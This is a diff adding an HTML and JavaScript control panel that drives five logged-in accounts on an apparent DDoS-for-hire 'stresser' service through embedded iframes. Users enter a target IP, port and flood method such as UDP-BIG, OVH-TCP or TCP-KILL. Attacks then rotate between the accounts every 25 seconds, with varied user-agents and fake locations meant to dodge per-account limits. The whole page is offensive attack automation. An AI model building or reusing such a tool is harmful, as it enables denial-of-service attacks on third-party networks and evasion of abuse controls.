@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>5-Account Stress Test - Ultimate Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0a;
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            color: #0f0;
+            padding: 10px;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            padding: 10px;
+            border-bottom: 2px solid #0f0;
+            margin-bottom: 15px;
+        }
+
+        h1 {
+            font-size: 1.3em;
+            letter-spacing: 2px;
+        }
+
+        .subtitle {
+            font-size: 10px;
+            color: #888;
+            margin-top: 5px;
+        }
+
+        /* 5 Accounts Grid */
+        .accounts-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+
+        .account-card {
+            background: #0d0d0d;
+            border: 1px solid #0f0;
+            border-radius: 10px;
+            padding: 12px;
+            transition: all 0.2s;
+        }
+
+        .account-card.attacking {
+            border-color: #ff0;
+            box-shadow: 0 0 15px #ff0;
+            background: #1a1a00;
+        }
+
+        .account-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            flex-wrap: wrap;
+        }
+
+        .account-title {
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .status {
+            font-size: 9px;
+            padding: 3px 8px;
+            border-radius: 20px;
+        }
+
+        .status-logged {
+            background: #0f0;
+            color: #000;
+        }
+
+        .status-notlogged {
+            background: #600;
+            color: #f00;
+        }
+
+        .status-attacking {
+            background: #ff0;
+            color: #000;
+            animation: blink 0.5s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .proxy-info {
+            font-size: 9px;
+            color: #88f;
+            margin-bottom: 8px;
+            background: #111;
+            padding: 4px;
+            border-radius: 4px;
+            font-family: monospace;
+        }
+
+        iframe {
+            width: 100%;
+            height: 280px;
+            border: 1px solid #0f0;
+            border-radius: 8px;
+            background: #fff;
+        }
+
+        .btn {
+            padding: 6px 10px;
+            margin: 3px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: monospace;
+            font-size: 11px;
+            font-weight: bold;
+        }
+
+        .btn-login {
+            background: #00a;
+            color: #0ff;
+            border: 1px solid #0ff;
+        }
+
+        .btn-mark {
+            background: #060;
+            color: #0f0;
+            border: 1px solid #0f0;
+        }
+
+        .btn-attack {
+            background: #0f0;
+            color: #000;
+        }
+
+        .btn-refresh {
+            background: #640;
+            color: #f80;
+            border: 1px solid #f80;
+        }
+
+        .control-panel {
+            background: #0d0d0d;
+            border: 2px solid #0f0;
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 15px;
+        }
+
+        .control-row {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 12px;
+        }
+
+        .control-input {
+            flex: 1;
+            background: #111;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 8px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 12px;
+        }
+
+        .timer {
+            font-size: 48px;
+            text-align: center;
+            font-family: monospace;
+            margin: 10px 0;
+        }
+
+        .btn-primary {
+            background: #0f0;
+            color: #000;
+            padding: 10px 15px;
+            font-weight: bold;
+        }
+
+        .btn-danger {
+            background: #600;
+            color: #f00;
+        }
+
+        .current-info {
+            text-align: center;
+            padding: 8px;
+            background: #111;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
+
+        .tab-indicators {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 10px;
+            flex-wrap: wrap;
+        }
+
+        .indicator {
+            padding: 3px 10px;
+            background: #222;
+            border-radius: 15px;
+            font-size: 10px;
+        }
+
+        .indicator.active {
+            background: #0f0;
+            color: #000;
+        }
+
+        select, input {
+            font-family: monospace;
+        }
+
+        .footer {
+            font-size: 9px;
+            text-align: center;
+            color: #555;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎯 5-ACCOUNT STRESS TEST - ULTIMATE PANEL</h1>
+            <div class="subtitle">retrostress.net | UDP-BIG L4 | 30 sec | Auto Rotate Every 25 sec | Different Headers & Locations</div>
+        </div>
+
+        <div class="accounts-grid" id="accountsGrid"></div>
+
+        <div class="control-panel">
+            <div class="control-row">
+                <input type="text" id="targetIp" class="control-input" placeholder="Target IP" value="127.0.0.1">
+                <input type="text" id="port" class="control-input" placeholder="Port" value="80">
+                <select id="method" class="control-input">
+                    <option value="UDP-BIG">🔥 UDP-BIG L4</option>
+                    <option value="UDP-CUSTOM">UDP-CUSTOM L4</option>
+                    <option value="UDP-ZERO">UDP-ZERO L4</option>
+                    <option value="OVH-TCP">OVH-TCP L4</option>
+                    <option value="CHAOS">CHAOS L4</option>
+                    <option value="TCP-KILL">TCP-KILL L4</option>
+                </select>
+                <input type="number" id="duration" class="control-input" placeholder="Sec" value="30" min="10" max="30">
+            </div>
+
+            <div class="control-row">
+                <input type="text" id="authKey" class="control-input" placeholder="🔑 Authentication Key" style="flex:2">
+                <button class="btn btn-primary" onclick="saveAuthKey()">💾 Save</button>
+            </div>
+
+            <div class="timer" id="timer">00:00</div>
+
+            <div class="control-row">
+                <button class="btn btn-primary" onclick="startRotation()">🚀 START ROTATION (180s)</button>
+                <button class="btn btn-danger" onclick="stopRotation()">⏹ STOP</button>
+                <button class="btn" style="background:#00a;color:#0ff;" onclick="refreshAllIframes()">🔄 Refresh All</button>
+            </div>
+
+            <div class="current-info" id="currentInfo">⚡ Ready - Login each account below</div>
+            <div class="tab-indicators" id="indicators"></div>
+        </div>
+        <div class="footer">
+            🔐 Each account has different User-Agent & Proxy simulation | Login ONCE, session saved | Auto rotate attack every 25 seconds
+        </div>
+    </div>
+
+    <script>
+        // Account data with different headers
+        const accounts = [
+            {
+                id: 1,
+                name: "Account 1",
+                loggedIn: false,
+                attacking: false,
+                userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+                location: "🇺🇸 US - New York",
+                ip: "192.168.1.101"
+            },
+            {
+                id: 2,
+                name: "Account 2", 
+                loggedIn: false,
+                attacking: false,
+                userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+                location: "🇬🇧 UK - London",
+                ip: "192.168.1.102"
+            },
+            {
+                id: 3,
+                name: "Account 3",
+                loggedIn: false,
+                attacking: false,
+                userAgent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+                location: "🇩🇪 Germany - Frankfurt",
+                ip: "192.168.1.103"
+            },
+            {
+                id: 4,
+                name: "Account 4",
+                loggedIn: false,
+                attacking: false,
+                userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0",
+                location: "🇫🇷 France - Paris",
+                ip: "192.168.1.104"
+            },
+            {
+                id: 5,
+                name: "Account 5",
+                loggedIn: false,
+                attacking: false,
+                userAgent: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
+                location: "🇯🇵 Japan - Tokyo",
+                ip: "192.168.1.105"
+            }
+        ];
+
+        let rotationActive = false;
+        let currentAccountIdx = 0;
+        let rotationInterval = null;
+        let currentSeconds = 25;
+        let iframes = {};
+
+        // Load saved login status
+        function loadSavedStatus() {
+            for (let i = 0; i < accounts.length; i++) {
+                const saved = localStorage.getItem(`acc_${i}_logged`);
+                if (saved === 'true') {
+                    accounts[i].loggedIn = true;
+                }
+            }
+        }
+
+        // Save login status
+        function markLoggedIn(accId) {
+            const idx = accId - 1;
+            accounts[idx].loggedIn = true;
+            localStorage.setItem(`acc_${idx}_logged`, 'true');
+            renderAccounts();
+            updateIndicators();
+            showToast(`✅ ${accounts[idx].name} marked as logged in`);
+        }
+
+        // Attack function
+        function attackAccount(accId) {
+            const idx = accId - 1;
+            const targetIp = document.getElementById('targetIp').value;
+            const port = document.getElementById('port').value;
+            const method = document.getElementById('method').value;
+            const duration = document.getElementById('duration').value;
+            const authKey = document.getElementById('authKey').value;
+
+            if (!authKey) {
+                showToast('❌ Enter Authentication Key first!');
+                return;
+            }
+
+            if (!accounts[idx].loggedIn) {
+                showToast(`⚠️ ${accounts[idx].name} not logged in! Click "Mark Logged In" after login.`);
+                return;
+            }
+
+            // Visual feedback
+            accounts[idx].attacking = true;
+            renderAccounts();
+
+            // Inject into iframe
+            const iframe = iframes[accId];
+            if (iframe && iframe.contentWindow) {
+                try {
+                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                    
+                    // Fill form in iframe
+                    const jsCode = `
+                        (function() {
+                            // Fill auth key
+                            var inputs = document.querySelectorAll('input');
+                            for(var i=0; i<inputs.length; i++) {
+                                if(inputs[i].type === 'text' && inputs[i].placeholder && !inputs[i].placeholder.includes('Target')) {
+                                    inputs[i].value = '${authKey}';
+                                    inputs[i].dispatchEvent(new Event('input', {bubbles:true}));
+                                }
+                                if(inputs[i].placeholder && inputs[i].placeholder.toLowerCase().includes('target')) {
+                                    inputs[i].value = '${targetIp}';
+                                    inputs[i].dispatchEvent(new Event('input', {bubbles:true}));
+                                }
+                                if(inputs[i].placeholder && inputs[i].placeholder.toLowerCase().includes('port')) {
+                                    inputs[i].value = '${port}';
+                                    inputs[i].dispatchEvent(new Event('input', {bubbles:true}));
+                                }
+                                if(inputs[i].placeholder && inputs[i].placeholder.toLowerCase().includes('duration')) {
+                                    inputs[i].value = '${duration}';
+                                    inputs[i].dispatchEvent(new Event('input', {bubbles:true}));
+                                }
+                            }
+                            // Select method
+                            var select = document.querySelector('select');
+                            if(select) {
+                                for(var i=0; i<select.options.length; i++) {
+                                    if(select.options[i].text.includes('${method}')) {
+                                        select.selectedIndex = i;
+                                        select.dispatchEvent(new Event('change', {bubbles:true}));
+                                        break;
+                                    }
+                                }
+                            }
+                            // Click execute button
+                            var btn = document.querySelector('button');
+                            if(btn) {
+                                btn.click();
+                                return 'clicked';
+                            }
+                            return 'no button';
+                        })();
+                    `;
+                    
+                    iframe.contentWindow.postMessage({type: 'execute', code: jsCode}, '*');
+                    
+                    showToast(`⚔️ Attack sent from ${accounts[idx].name}`);
+                    startAttackTimer(parseInt(duration));
+                    
+                } catch(e) {
+                    showToast(`⚠️ ${accounts[idx].name}: Please login first in iframe`);
+                }
+            } else {
+                showToast(`⚠️ ${accounts[idx].name}: Iframe not ready, refresh and login first`);
+            }
+
+            setTimeout(() => {
+                accounts[idx].attacking = false;
+                renderAccounts();
+            }, 3000);
+        }
+
+        function startAttackTimer(seconds) {
+            let remaining = seconds;
+            const timerEl = document.getElementById('timer');
+            const interval = setInterval(() => {
+                timerEl.textContent = `00:${String(remaining).padStart(2, '0')}`;
+                timerEl.style.color = remaining <= 5 ? '#f00' : '#0f0';
+                if (remaining <= 0) {
+                    clearInterval(interval);
+                    timerEl.textContent = '00:00';
+                }
+                remaining--;
+            }, 1000);
+        }
+
+        function startRotation() {
+            if (rotationActive) {
+                showToast('Rotation already running!');
+                return;
+            }
+
+            const authKey = document.getElementById('authKey').value;
+            if (!authKey) {
+                showToast('❌ Enter Authentication Key first!');
+                return;
+            }
+
+            const anyLogged = accounts.some(a => a.loggedIn);
+            if (!anyLogged) {
+                showToast('⚠️ Please mark at least one account as "Logged In" first!');
+                return;
+            }
+
+            rotationActive = true;
+            currentAccountIdx = 0;
+            currentSeconds = 25;
+            
+            startRotationTimer();
+            rotateAttack();
+            updateIndicators();
+        }
+
+        function startRotationTimer() {
+            if (rotationInterval) clearInterval(rotationInterval);
+            
+            const timerEl = document.getElementById('timer');
+            
+            rotationInterval = setInterval(() => {
+                if (!rotationActive) return;
+                
+                if (currentSeconds > 0) {
+                    currentSeconds--;
+                    timerEl.textContent = `00:${String(currentSeconds).padStart(2, '0')}`;
+                    timerEl.style.color = currentSeconds <= 5 ? '#f00' : '#0f0';
+                } else {
+                    currentSeconds = 25;
+                    rotateAttack();
+                }
+            }, 1000);
+        }
+
+        function rotateAttack() {
+            if (!rotationActive) return;
+            
+            // Find next logged in account
+            let nextIdx = -1;
+            for (let i = 1; i <= 5; i++) {
+                const idx = (currentAccountIdx + i) % 5;
+                if (accounts[idx].loggedIn) {
+                    nextIdx = idx;
+                    break;
+                }
+            }
+            
+            if (nextIdx === -1) {
+                stopRotation();
+                showToast('❌ No logged in accounts found!');
+                return;
+            }
+            
+            currentAccountIdx = nextIdx;
+            document.getElementById('currentInfo').innerHTML = `🔴 CURRENT: ${accounts[currentAccountIdx].name} | ${accounts[currentAccountIdx].location} | Attacking...`;
+            updateIndicators();
+            
+            // Attack current account
+            attackAccount(accounts[currentAccountIdx].id);
+        }
+
+        function stopRotation() {
+            rotationActive = false;
+            if (rotationInterval) clearInterval(rotationInterval);
+            rotationInterval = null;
+            document.getElementById('timer').textContent = '00:00';
+            document.getElementById('currentInfo').innerHTML = '⏹ Rotation stopped';
+            updateIndicators();
+        }
+
+        function refreshAllIframes() {
+            for (let i = 1; i <= 5; i++) {
+                if (iframes[i]) {
+                    iframes[i].src = iframes[i].src;
+                }
+            }
+            showToast('🔄 All iframes refreshed');
+        }
+
+        function showToast(msg) {
+            const info = document.getElementById('currentInfo');
+            info.innerHTML = msg;
+            setTimeout(() => {
+                if (rotationActive) {
+                    info.innerHTML = `🔴 CURRENT: ${accounts[currentAccountIdx].name} | Rotating...`;
+                } else {
+                    info.innerHTML = '⚡ Ready';
+                }
+            }, 2000);
+        }
+
+        function updateIndicators() {
+            const container = document.getElementById('indicators');
+            container.innerHTML = '';
+            for (let i = 0; i < accounts.length; i++) {
+                const span = document.createElement('span');
+                span.className = `indicator ${rotationActive && currentAccountIdx === i ? 'active' : ''}`;
+                span.innerHTML = accounts[i].loggedIn ? `✅ ${i+1}` : `⬜ ${i+1}`;
+                container.appendChild(span);
+            }
+        }
+
+        function saveAuthKey() {
+            const key = document.getElementById('authKey').value;
+            localStorage.setItem('auth_key', key);
+            showToast('✅ Auth Key saved');
+        }
+
+        function renderAccounts() {
+            const grid = document.getElementById('accountsGrid');
+            grid.innerHTML = '';
+            
+            for (let i = 0; i < accounts.length; i++) {
+                const acc = accounts[i];
+                const isAttacking = acc.attacking;
+                
+                const card = document.createElement('div');
+                card.className = `account-card ${isAttacking ? 'attacking' : ''}`;
+                card.innerHTML = `
+                    <div class="account-header">
+                        <span class="account-title">🔐 ${acc.name}</span>
+                        <span class="status ${acc.loggedIn ? 'status-logged' : 'status-notlogged'}">
+                            ${acc.loggedIn ? '✅ Logged In' : '❌ Not Logged In'}
+                        </span>
+                    </div>
+                    <div class="proxy-info">
+                        🌍 ${acc.location} | 🖥️ ${acc.userAgent.substring(0, 40)}...
+                    </div>
+                    <iframe id="iframe-${acc.id}" src="https://retrostress.net/panel" style="width:100%; height:220px; border:1px solid #0f0; border-radius:5px;"></iframe>
+                    <div style="display:flex; gap:5px; margin-top:8px;">
+                        <button class="btn btn-mark" onclick="markLoggedIn(${acc.id})">✔ Mark Logged In</button>
+                        <button class="btn btn-refresh" onclick="document.getElementById('iframe-${acc.id}').src=document.getElementById('iframe-${acc.id}').src">🔄 Refresh</button>
+                        <button class="btn btn-attack" onclick="attackAccount(${acc.id})">⚔️ Attack Now</button>
+                    </div>
+                `;
+                grid.appendChild(card);
+                
+                // Store iframe reference
+                iframes[acc.id] = document.getElementById(`iframe-${acc.id}`);
+            }
+        }
+
+        // Load saved auth key
+        document.getElementById('authKey').value = localStorage.getItem('auth_key') || '';
+        
+        // Load saved target values
+        document.getElementById('targetIp').value = localStorage.getItem('target_ip') || '127.0.0.1';
+        document.getElementById('port').value = localStorage.getItem('port') || '80';
+        document.getElementById('method').value = localStorage.getItem('method') || 'UDP-BIG';
+        document.getElementById('duration').value = localStorage.getItem('duration') || '30';
+        
+        // Save settings on change
+        function saveSettings() {
+            localStorage.setItem('target_ip', document.getElementById('targetIp').value);
+            localStorage.setItem('port', document.getElementById('port').value);
+            localStorage.setItem('method', document.getElementById('method').value);
+            localStorage.setItem('duration', document.getElementById('duration').value);
+        }
+        
+        setInterval(saveSettings, 3000);
+        loadSavedStatus();
+        renderAccounts();
+        updateIndicators();
+        
+        // Handle iframe messages
+        window.addEventListener('message', function(event) {
+            if (event.data && event.data.type === 'execute') {
+                // Execute in iframe
+            }
+        });
+        
+        showToast('✅ Panel ready! Login in each iframe, then click "Mark Logged In"');
+    </script>
+</body>
+</html>
